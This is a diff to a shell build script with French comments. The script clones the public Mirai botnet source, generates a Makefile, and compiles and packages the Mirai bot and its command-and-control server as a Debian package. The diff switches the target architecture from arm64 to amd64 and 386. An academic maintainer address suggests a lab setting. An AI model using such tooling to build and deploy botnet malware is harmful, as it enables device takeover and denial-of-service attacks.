@@ -4,7 +4,7 @@
 REPO_URL="https://github.com/jgamblin/Mirai-Source-Code.git"
 REPO_BASE="Mirai-Source-Code"
 REPO_DIR="$REPO_BASE/mirai"
-ARCH="arm64"
+ARCH="amd64"
 PACKAGE_NAME="mirai-bot-and-cnc"
 VERSION="1.0"
 MAINTAINER="Joachim Schmidt <joachim.schmidt@hesge.ch>"
@@ -20,14 +20,14 @@ fi
 # === Détection et installation des dépendances ===
 echo "[*] Vérification des dépendances..."
 
-REQUIRED_CMDS=("git" "go" "aarch64-linux-gnu-gcc" "dpkg-deb" "strip")
+REQUIRED_CMDS=("git" "go" "dpkg-deb" "strip")
 
 for cmd in "${REQUIRED_CMDS[@]}"; do
     if ! command -v "$cmd" &>/dev/null; then
         echo "[!] $cmd est manquant. Installation..."
         sudo apt-get update
         sudo apt-get install -y \
-            git golang gcc-aarch64-linux-gnu dpkg-dev binutils-aarch64-linux-gnu
+            git golang dpkg-dev 
         break
     fi
 done
@@ -56,8 +56,8 @@ cd -
 echo "[*] Génération du Makefile dans bot/..."
 MAKEFILE="$REPO_DIR/bot/Makefile"
 cat > "$MAKEFILE" <<EOF
-CC=aarch64-linux-gnu-gcc
-CFLAGS=-std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -static -DMIRAI_BOT_ARCH=\"arm64\" -DMIRAI_TELNET
+CC=gcc
+CFLAGS=-std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -static -DMIRAI_BOT_ARCH=\"amd64\" -DMIRAI_TELNET
 
 RELEASE_DIR := \$(CURDIR)/release
 
@@ -67,7 +67,7 @@ mirai:
 	@echo "[*] Compilation de Mirai (bot)..."
 	mkdir -p "\$(RELEASE_DIR)"
 	\$(CC) \$(CFLAGS) *.c -o "\$(RELEASE_DIR)/mirai"
-	aarch64-linux-gnu-strip "\$(RELEASE_DIR)/mirai"
+	strip "\$(RELEASE_DIR)/mirai"
 
 clean:
 	rm -rf "\$(RELEASE_DIR)"
@@ -93,7 +93,7 @@ fi
 
 go mod tidy
 
-GOARCH=arm64 GOOS=linux go build -o "$CNC_RELEASE_DIR/cnc" . || { echo "Erreur lors de la compilation du CNC"; exit 1; }
+GOARCH=386 GOOS=linux go build -o "$CNC_RELEASE_DIR/cnc" . || { echo "Erreur lors de la compilation du CNC"; exit 1; }
 
 cd -
 
